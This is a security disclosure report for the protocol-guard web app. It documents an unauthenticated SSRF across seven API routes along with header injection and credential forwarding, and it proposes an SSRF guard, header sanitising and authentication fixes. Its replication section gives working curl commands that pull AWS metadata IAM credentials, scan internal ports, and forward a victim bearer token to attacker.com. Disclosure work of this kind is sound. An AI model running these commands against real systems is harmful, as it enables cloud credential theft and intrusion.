@@ -1,0 +1,265 @@
+VULNERABILITY REPORT
+====================
+Repository: https://github.com/arananet/protocol-guard
+
+## Vulnerability
+Unauthenticated Full-Network SSRF Proxy — CWE-918 (Zero Validation)
+Combined with: Arbitrary Header Injection & Credential Forwarding — CWE-74, CWE-522
+
+## Location
+
+SSRF present in ALL 7 API routes — no URL validation anywhere in the codebase:
+
+1. apps/web/src/app/api/a2a/agent-card/route.ts  line 52  — agentUrl → fetch()
+2. apps/web/src/app/api/a2a/send-task/route.ts    line 37  — agentUrl → fetch()
+3. apps/web/src/app/api/a2a/security/route.ts     line 374 — agentUrl → fetch()
+4. apps/web/src/app/api/mcp/call-tool/route.ts    line 37  — serverUrl → fetch()
+5. apps/web/src/app/api/mcp/security/route.ts     line 989 — serverUrl → fetch()
+6. apps/web/src/app/api/mcp/tools/route.ts        line 38  — serverUrl → fetch()
+7. apps/web/src/app/api/ucp/test/route.ts         line 393 — endpoint → fetch()
+
+## Description
+
+### 1. Full SSRF — Zero URL Validation (CRITICAL)
+
+Unlike typical SSRF issues where developers attempt validation and fail, protocol-guard
+performs NO validation whatsoever on user-supplied URLs before making server-side
+HTTP requests. Every endpoint accepts any URL string and fetches it directly.
+
+Reachable internal targets from any cloud deployment:
+  - http://169.254.169.254/latest/meta-data/iam/security-credentials/  (AWS IMDS)
+  - http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
+  - http://169.254.169.254/metadata/instance?api-version=2021-02-01   (Azure IMDS)
+  - http://127.0.0.1:<any-port>/  (any local service — databases, admin panels)
+  - http://10.x.x.x/  http://172.16.x.x/  http://192.168.x.x/  (internal networks)
+  - file:// protocol (depending on fetch implementation)
+
+None of the 7 routes are authenticated, so this is fully exploitable by any
+unauthenticated internet user. The app is effectively a public open SSRF proxy
+serving the entire internet.
+
+### 2. Arbitrary Header Injection & Credential Forwarding (HIGH)
+
+All routes accept a user-controlled authHeader field and a customHeaders array:
+
+  // All routes — e.g. a2a/agent-card/route.ts lines 20-33
+  headers[authHeader || 'Authorization'] = authValue;   // ← raw header key injection
+  for (const h of customHeaders) {
+    if (h.key && h.value) headers[h.key] = h.value;    // ← arbitrary headers
+  }
+
+Attacks enabled:
+  a) Host header injection: set authHeader="Host", authValue="internal.corp" to
+     change routing on reverse proxies behind the server.
+  b) Credential exfiltration: an attacker submits agentUrl="https://attacker.com"
+     with a victim's real bearer token as authValue. The server forwards the token
+     to the attacker's endpoint, completing credential theft.
+  c) HTTP header injection: if h.key contains \r\n, the underlying fetch may be
+     vulnerable to HTTP response splitting (depends on Node.js undici version).
+  d) Override Content-Type, Accept, or other request-shaping headers to manipulate
+     how target servers handle the forged request.
+
+### 3. No Authentication on Any Route (HIGH)
+
+Zero authentication, rate limiting, or authorization on all 7 API routes.
+Any unauthenticated HTTP client on the internet can:
+  - Scan internal networks via the SSRF proxy (port scanning via timing/errors)
+  - Enumerate cloud metadata services
+  - Use the app's outbound IP (trusted in corporate environments) to reach
+    internal services that allowlist the app's IP
+  - Abuse the MCP/A2A testing endpoints as an attack relay against third-party
+    AI infrastructure at scale
+
+### 4. Full Internal Response Reflected to Caller (HIGH)
+
+The agent-card and security routes return the entire raw server response body
+to the caller:
+
+  // a2a/agent-card/route.ts line 70
+  return NextResponse.json({ card: json, resolvedUrl: url });
+
+  // a2a/security/route.ts line 594
+  raw: { agentCard: card }
+
+Combined with SSRF, this means:
+  1. Attacker sends agentUrl = http://169.254.169.254/latest/meta-data/
+  2. The server fetches the AWS metadata endpoint
+  3. The response JSON (IAM role names, account IDs, etc.) is returned verbatim
+  4. A second request to http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
+     returns temporary AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, and AWS_SESSION_TOKEN
+
+### 5. probeEndpoint() in Security Scanner Sends Live Exploits (MEDIUM)
+
+The MCP and A2A security routes do not just scan — they actively probe the target:
+
+  // a2a/security/route.ts lines 456-501
+  async function probeEndpoint(card, extraHeaders) {
+    const res = await fetch(agentUrl, {
+      method: 'POST',
+      body: JSON.stringify({ jsonrpc: '2.0', method: 'tasks/send', ... }),
+    });
+  }
+
+An attacker can weaponize the "security scanner" to send arbitrary JSON-RPC
+payloads to any internal or external service, including:
+  - Sending malicious tasks to legitimate AI agents on behalf of the app's IP
+  - Attacking internal JSON-RPC services that accept POST requests
+  - Bypassing firewalls that trust the app server's IP
+
+## How to Replicate
+
+### SSRF — AWS Metadata Exfiltration (No Auth Required)
+
+Step 1 — Get IAM role name:
+  curl -X POST https://<deployed-app>/api/a2a/agent-card \
+    -H 'Content-Type: application/json' \
+    -d '{"agentUrl":"http://169.254.169.254/latest/meta-data/iam/info"}'
+
+  # Response contains: {"card":{"Code":"Success","InstanceProfileArn":"arn:aws:iam::123456789:instance-profile/...","InstanceProfileId":"AIPAXXXXXXXXXXXXXXXX"},"resolvedUrl":"http://169.254.169.254/..."}
+
+Step 2 — Dump credentials:
+  curl -X POST https://<deployed-app>/api/a2a/agent-card \
+    -H 'Content-Type: application/json' \
+    -d '{"agentUrl":"http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"}'
+
+  # Response contains AccessKeyId, SecretAccessKey, Token — full AWS compromise
+
+### Internal Port Scan via Timing
+
+  for port in 22 3306 5432 6379 8080 9200; do
+    time curl -s -X POST https://<app>/api/a2a/send-task \
+      -H 'Content-Type: application/json' \
+      -d "{\"agentUrl\":\"http://127.0.0.1:$port\",\"message\":\"probe\"}"
+  done
+  # Closed ports fail fast; open ports take longer — reveals internal topology
+
+### Credential Forwarding Attack
+
+  curl -X POST https://<app>/api/a2a/agent-card \
+    -H 'Content-Type: application/json' \
+    -d '{
+      "agentUrl": "https://attacker.com/steal",
+      "authType": "bearer",
+      "authValue": "<victim-user-token>"
+    }'
+  # The app forwards Authorization: Bearer <victim-token> to attacker.com
+
+## Proposed Fix
+
+### Fix 1 — Create a shared SSRF guard and apply to ALL routes
+
+Create apps/web/src/lib/validateUrl.ts:
+
+  import dns from 'dns/promises';
+
+  const PRIVATE_RANGES = [
+    /^127\./,
+    /^10\./,
+    /^172\.(1[6-9]|2\d|3[01])\./,
+    /^192\.168\./,
+    /^169\.254\./,
+    /^::1$/,
+    /^fc.{2}:/i,
+    /^fe80:/i,
+  ];
+
+  export async function assertPublicUrl(rawUrl: string): Promise<void> {
+    let parsed: URL;
+    try {
+      parsed = new URL(rawUrl);
+    } catch {
+      throw new Error('Invalid URL');
+    }
+    if (!['http:', 'https:'].includes(parsed.protocol)) {
+      throw new Error('Only http/https allowed');
+    }
+    // Resolve DNS and check every resolved IP
+    const addrs = await dns.resolve4(parsed.hostname).catch(() => []);
+    for (const addr of addrs) {
+      if (PRIVATE_RANGES.some(r => r.test(addr))) {
+        throw new Error('URL resolves to a private/internal IP address');
+      }
+    }
+    // Metadata endpoints by hostname
+    const blocked = ['169.254.169.254', 'metadata.google.internal'];
+    if (blocked.includes(parsed.hostname.toLowerCase())) {
+      throw new Error('Cloud metadata endpoint blocked');
+    }
+  }
+
+In each route, call this before any fetch():
+
+  import { assertPublicUrl } from '@/lib/validateUrl';
+
+  export async function POST(request: NextRequest) {
+    const { agentUrl } = await request.json();
+    await assertPublicUrl(agentUrl);  // throws → caught by try/catch → 400
+    // ... rest of handler
+  }
+
+### Fix 2 — Sanitize Custom Header Keys
+
+  const FORBIDDEN_HEADER_KEYS = /^(host|content-length|transfer-encoding)$/i;
+
+  for (const h of customHeaders) {
+    if (h.key && h.value && !FORBIDDEN_HEADER_KEYS.test(h.key)) {
+      // Also strip \r\n to prevent header injection:
+      const safeKey = String(h.key).replace(/[\r\n]/g, '');
+      const safeVal = String(h.value).replace(/[\r\n]/g, '');
+      headers[safeKey] = safeVal;
+    }
+  }
+
+### Fix 3 — Add Authentication to All Routes
+
+  // middleware.ts (Next.js middleware)
+  import { NextRequest, NextResponse } from 'next/server';
+
+  const API_SECRET = process.env.API_SECRET;
+
+  export function middleware(req: NextRequest) {
+    if (req.nextUrl.pathname.startsWith('/api/')) {
+      const key = req.headers.get('x-api-key');
+      if (!API_SECRET || key !== API_SECRET) {
+        return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
+      }
+    }
+    return NextResponse.next();
+  }
+
+  export const config = { matcher: ['/api/:path*'] };
+
+### Fix 4 — Limit What Is Returned to the Caller
+
+Do not return raw internal response bodies. Extract only the specific fields
+needed by the UI:
+  // Instead of: return NextResponse.json({ card: json, resolvedUrl: url });
+  return NextResponse.json({
+    name: json?.name,
+    version: json?.version,
+    skills: json?.skills,
+    resolvedUrl: url,
+  });
+
+## Severity
+
+CRITICAL — This is an unauthenticated, zero-validation SSRF proxy exposed to the
+public internet across 7 endpoints. In any cloud deployment it enables:
+  1. Full IAM credential exfiltration (AWS/GCP/Azure) in a single HTTP request
+  2. Complete internal network mapping
+  3. Abuse of the server's trusted network position to attack third-party services
+
+## Additional Findings
+
+| # | File | Issue | Severity |
+|---|------|-------|----------|
+| 1 | ALL 7 routes | No SSRF protection — any URL fetched server-side | CRITICAL |
+| 2 | ALL 7 routes | Zero authentication — fully public proxy | HIGH |
+| 3 | ALL 7 routes | authHeader is used as raw header key — Host injection possible | HIGH |
+| 4 | ALL 7 routes | customHeaders passed through without sanitization | HIGH |
+| 5 | a2a/agent-card, a2a/security | Raw server response body returned to caller (exfil data leak) | HIGH |
+| 6 | a2a/security/route.ts:456 | probeEndpoint() weaponizes scanner to send live payloads to any URL | MEDIUM |
+| 7 | mcp/call-tool/route.ts:43 | toolName and toolArgs passed to user-controlled server with no allowlist | MEDIUM |
+| 8 | a2a/security, mcp/security | Security scan results include raw agent/server data (potential reflected content) | MEDIUM |
+| 9 | ALL routes | No rate limiting — unlimited SSRF requests possible | MEDIUM |
+| 10 | .env.example | No SSRF guard env var or API_SECRET documented — no awareness of the issue | LOW |
